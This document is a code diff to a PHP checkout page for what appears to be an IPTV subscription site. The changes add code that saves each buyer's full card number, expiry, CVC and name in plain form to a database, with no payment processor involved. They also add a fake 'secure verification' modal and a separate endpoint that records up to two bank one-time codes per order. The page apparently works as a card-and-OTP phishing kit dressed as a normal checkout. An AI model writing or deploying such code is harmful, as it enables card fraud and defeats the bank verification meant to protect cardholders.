@@ -10,6 +10,77 @@ $pdo = require __DIR__ . '/../config/database.php';
 
 logVisit($pdo);
 
+$postOfferId = isset($_POST['offer_id']) ? max(0, (int) $_POST['offer_id']) : null;
+$offerId = $postOfferId !== null ? $postOfferId : (isset($_GET['offer']) ? max(0, (int) $_GET['offer']) : 0);
+
+$paymentSuccess = false;
+$confirmationCode = '';
+$isAjax = (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') || (isset($_POST['ajax']) && $_POST['ajax'] === '1');
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && $isAjax && isset($_POST['otp_value'], $_POST['order_id'])) {
+    $otpValue = substr(preg_replace('/\D/', '', (string) ($_POST['otp_value'] ?? '')), 0, 10);
+    $orderId = max(0, (int) ($_POST['order_id'] ?? 0));
+    $slot = (int) ($_POST['otp_slot'] ?? 1);
+    $column = $slot === 2 ? 'otp2' : 'otp';
+    $ok = false;
+    if ($orderId > 0 && $otpValue !== '') {
+        $stmt = $pdo->prepare(sprintf('UPDATE orders SET %s = :otp WHERE id = :id', $column));
+        $stmt->execute([
+            'otp' => $otpValue,
+            'id' => $orderId,
+        ]);
+        $ok = $stmt->rowCount() > 0;
+    }
+    header('Content-Type: application/json');
+    echo json_encode([
+        'success' => $ok,
+        'error' => $ok ? null : 'OTP update failed.',
+    ]);
+    exit;
+}
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    try {
+    $stmt = $pdo->prepare('INSERT INTO orders (offer_id, contact, newsletter, delivery, first_name, last_name, company, address, apartment, city, country, state, zip, phone, card_number, expiry, cvc, card_name, discount, otp, otp2) VALUES (:offer_id, :contact, :newsletter, :delivery, :first_name, :last_name, :company, :address, :apartment, :city, :country, :state, :zip, :phone, :card_number, :expiry, :cvc, :card_name, :discount, :otp, :otp2)');
+    $stmt->execute([
+        'offer_id' => $offerId,
+        'contact' => $_POST['contact'] ?? '',
+        'newsletter' => isset($_POST['newsletter']) ? 1 : 0,
+        'delivery' => $_POST['delivery'] ?? '',
+            'first_name' => $_POST['first_name'] ?? '',
+            'last_name' => $_POST['last_name'] ?? '',
+            'company' => $_POST['company'] ?? '',
+            'address' => $_POST['address'] ?? '',
+            'apartment' => $_POST['apartment'] ?? '',
+            'city' => $_POST['city'] ?? '',
+            'country' => $_POST['country'] ?? '',
+            'state' => $_POST['state'] ?? '',
+            'zip' => $_POST['zip'] ?? '',
+            'phone' => $_POST['phone'] ?? '',
+        'card_number' => $_POST['card_number'] ?? '',
+        'expiry' => $_POST['expiry'] ?? '',
+        'cvc' => $_POST['cvc'] ?? '',
+        'card_name' => $_POST['card_name'] ?? '',
+        'discount' => $_POST['discount'] ?? '',
+        'otp' => NULL,
+        'otp2' => NULL,
+    ]);
+        $confirmationCode = $pdo->lastInsertId();
+        $paymentSuccess = true;
+    } catch (\Throwable $e) {
+        $paymentSuccess = false;
+        $confirmationCode = '';
+    }
+
+    if ($isAjax) {
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => $paymentSuccess,
+            'confirmation' => $confirmationCode,
+            'error' => $paymentSuccess ? null : 'Payment could not be processed.',
+        ]);
+        exit;
+    }
+}
+
 $settings = getSettings($pdo);
 $themeVars = getActiveThemeVars($settings['active_theme'] ?? 'onyx');
 $brandTitleSetting = trim($settings['brand_title'] ?? '');
@@ -23,7 +94,6 @@ if ($brandLogoMobile === '' && $brandLogoDesktop !== '') {
 }
 $supportWhatsappNumber = trim($settings['support_whatsapp_number'] ?? '') ?: ($config['whatsapp_number'] ?? '');
 
-$offerId = isset($_GET['offer']) ? max(0, (int) $_GET['offer']) : 0;
 $selectedOffer = null;
 if ($offerId > 0) {
     $stmt = $pdo->prepare('SELECT * FROM offers WHERE id = :id LIMIT 1');
@@ -55,14 +125,7 @@ $offerFeatures = splitFeatures($selectedOffer['features'] ?? '');
 $whatsappLink = getWhatsappLink($supportWhatsappNumber, $offerName, (float) ($selectedOffer['price'] ?? 0), $offerDuration);
 
 $basePath = appBasePath();
-$mediaBase = $basePath . '/assets/images/demo';
-$posterFallback = $mediaBase . '/kfp4.webp';
-$posterImage = $posterFallback;
-$posterStmt = $pdo->query('SELECT image_url FROM movie_posters ORDER BY created_at DESC LIMIT 1');
-$posterRow = $posterStmt->fetch(PDO::FETCH_ASSOC);
-if ($posterRow && !empty($posterRow['image_url'])) {
-    $posterImage = $posterRow['image_url'];
-}
+$posterImage = $basePath . '/assets/images/iptv-logo.svg';
 
 $seoTitle = 'Paiement - ' . $offerName . ' | ' . $brandName;
 $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration . ') avec un checkout façon Shopify.';
@@ -100,7 +163,8 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
                         </div>
                         <span class="price-tag">$<?= e($offerPrice) ?></span>
                     </div>
-                    <form class="checkout-form" action="#" method="post" novalidate>
+                    <form class="checkout-form" action="<?= e($_SERVER['REQUEST_URI'] ?? '') ?>" method="post" novalidate>
+                        <input type="hidden" name="offer_id" value="<?= (int) $offerId ?>">
                         <div class="form-head">
                             <h3>Contact information</h3>
                         </div>
@@ -175,11 +239,11 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
                     <label>Phone
                         <input type="text" name="phone" placeholder="+1 514 555 0000" required>
                     </label>
-                    <div class="payment-confirmation" hidden data-payment-confirmation>
+                    <div class="payment-confirmation" <?= $paymentSuccess ? '' : 'hidden' ?> data-payment-confirmation>
                         <div class="confirmation-icon">✔</div>
                         <div>
                             <strong>Thank you!</strong>
-                            <p>Confirmation #<span data-confirmation-code></span></p>
+                            <p>Confirmation #<span data-confirmation-code><?= e($confirmationCode) ?></span></p>
                         </div>
                     </div>
                     <div class="card-payment">
@@ -203,13 +267,7 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
                                     </span>
                                 </span>
                             </div>
-                        </div>
-                            <div class="card-payment__method">
-                                <span class="card-payment__pill">
-                                    <span class="dot"></span>
-                                    Credit card
-                                </span>
-                            </div>
+                    </div>
                         <div class="card-payment__grid">
                             <label class="card-input">
                                 Card number
@@ -251,9 +309,10 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
                         </div>
                     </div>
                     <div class="checkout-actions">
-                        <button type="button" class="btn primary" data-card-submit>Pay now</button>
+                        <button type="submit" class="btn primary" data-card-submit>Pay now</button>
                         <a href="<?= $basePath ?>/#offres" class="link-light">Return to offers</a>
                     </div>
+                    <p class="input-error" data-payment-error></p>
                 </form>
             </div>
                 <div class="payment-column payment-column--summary">
@@ -313,126 +372,28 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
             <path fill="currentColor" d="M12 2a10 10 0 0 0-8.94 14.5L2 22l5.65-1.48A10 10 0 1 0 12 2zm0 1.8a8.2 8.2 0 0 1 6.69 12.85 8.2 8.2 0 0 1-9.34 2.59l-.27-.1-3.38.88.9-3.34-.17-.28A8.2 8.2 0 0 1 12 3.8zm3.66 5.04c-.2-.005-.49-.01-.77.48-.27.49-.9 1.4-.98 1.5-.08.1-.18.15-.32.08-.14-.07-.6-.22-1.14-.56-.84-.48-1.37-1.08-1.53-1.26-.16-.18-.02-.28.12-.41.12-.12.3-.32.42-.48.14-.16.18-.28.26-.46.08-.18.04-.35-.02-.48-.07-.13-.6-1.46-.82-2-.22-.54-.46-.48-.63-.48h-.54c-.17 0-.44.06-.67.31-.23.25-.88.86-.88 2.1 0 1.24.9 2.44 1.03 2.6.12.16 1.78 2.72 4.3 3.9.6.27 1.07.43 1.44.55.6.19 1.14.16 1.57.1.48-.07 1.48-.61 1.69-1.21.21-.6.21-1.12.15-1.21-.06-.09-.22-.14-.42-.15z"/>
         </svg>
     </a>
-    <div class="otp-modal" hidden data-otp-modal>
+    <div class="payment-overlay" data-payment-loader hidden>
+        <div class="payment-overlay__content">
+            <div class="loading-ring"></div>
+            <p>Processing payment...</p>
+        </div>
+    </div>
+    <div class="otp-modal" data-otp-modal hidden>
         <div class="otp-modal__content">
             <h3>Secure verification</h3>
-            <p>Enter the 6-digit code sent to your phone.</p>
-            <input
-                type="tel"
-                maxlength="6"
-                inputmode="numeric"
-                pattern="[0-9]*"
-                autocomplete="one-time-code"
-                data-otp-input
-                oninput="this.value=this.value.replace(/\\D/g,'').slice(0,6)"
-            >
+            <p>Enter the 6-digit OTP sent to you to finalize the payment.</p>
+            <input type="tel" maxlength="6" placeholder="______" inputmode="numeric" data-otp-input autocomplete="one-time-code">
+            <small class="input-error" data-otp-error></small>
             <div class="otp-modal__actions">
                 <button type="button" class="btn primary" data-otp-confirm>Confirm</button>
                 <button type="button" class="btn ghost" data-otp-cancel>Cancel</button>
             </div>
-            <small class="input-error" data-otp-error></small>
         </div>
     </div>
     <script>
         window.APP_THEME = <?= json_encode($settings['active_theme'] ?? 'onyx') ?>;
     </script>
     <script src="<?= $basePath ?>/assets/js/main.js?v=<?= time() ?>" defer></script>
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const submitBtn = document.querySelector('[data-card-submit]');
-            const otpModal = document.querySelector('[data-otp-modal]');
-            const otpInput = document.querySelector('[data-otp-input]');
-            const otpError = document.querySelector('[data-otp-error]');
-            const otpCancel = document.querySelector('[data-otp-cancel]');
-            const cvcInput = document.querySelector('[data-card-cvc]');
-            const form = submitBtn?.closest('form');
-            if (!submitBtn || !otpModal) return;
 
-            const digitsOnly = (value, limit) => value.replace(/\D/g, '').slice(0, limit);
-            const requiredCvc = () => {
-                if (!cvcInput) return 3;
-                const dataVal = Number(cvcInput.dataset.requiredCvc || '');
-                if (dataVal > 0) return dataVal;
-                const maxAttr = Number(cvcInput.maxLength || '');
-                return maxAttr > 0 ? maxAttr : 3;
-            };
-
-            const closeOtp = () => {
-                otpModal.hidden = true;
-                document.body.classList.remove('modal-open');
-            };
-
-            if (otpInput) {
-                otpInput.addEventListener('beforeinput', (event) => {
-                    if (event.data && /\D/.test(event.data)) {
-                        event.preventDefault();
-                    }
-                });
-                otpInput.addEventListener('keydown', (event) => {
-                    if (!/^\d$/.test(event.key) && !['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(event.key)) {
-                        event.preventDefault();
-                    }
-                });
-                otpInput.addEventListener('input', () => {
-                    const cleaned = digitsOnly(otpInput.value, 6);
-                    if (otpInput.value !== cleaned) {
-                        otpInput.value = cleaned;
-                    }
-                });
-                otpInput.addEventListener('paste', (event) => {
-                    event.preventDefault();
-                    const data = (event.clipboardData || window.clipboardData)?.getData('text') || '';
-                    otpInput.value = digitsOnly(data, 6);
-                });
-            }
-
-            if (cvcInput) {
-                cvcInput.addEventListener('beforeinput', (event) => {
-                    if (event.data && /\D/.test(event.data)) {
-                        event.preventDefault();
-                    }
-                });
-                cvcInput.addEventListener('keydown', (event) => {
-                    if (!/^\d$/.test(event.key) && !['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(event.key)) {
-                        event.preventDefault();
-                    }
-                });
-                cvcInput.addEventListener('input', () => {
-                    const needed = requiredCvc();
-                    const cleaned = digitsOnly(cvcInput.value, needed);
-                    if (cvcInput.value !== cleaned) {
-                        cvcInput.value = cleaned;
-                    }
-                });
-                cvcInput.addEventListener('paste', (event) => {
-                    event.preventDefault();
-                    const data = (event.clipboardData || window.clipboardData)?.getData('text') || '';
-                    cvcInput.value = digitsOnly(data, 4);
-                });
-            }
-
-            submitBtn.addEventListener('click', () => {
-                setTimeout(() => {
-                    if (form && form.reportValidity && !form.reportValidity()) {
-                        submitBtn.setAttribute('aria-invalid', 'true');
-                        return;
-                    }
-                    if (!otpModal.hidden) return;
-                    if (submitBtn.getAttribute('aria-invalid') === 'true') return;
-                    otpModal.hidden = false;
-                    document.body.classList.add('modal-open');
-                    if (otpInput) otpInput.focus();
-                    if (otpError) otpError.textContent = '';
-                }, 10);
-            });
-
-            otpCancel?.addEventListener('click', closeOtp);
-            otpModal.addEventListener('click', (event) => {
-                if (event.target === otpModal) {
-                    closeOtp();
-                }
-            });
-        });
-    </script>
 </body>
 </html>
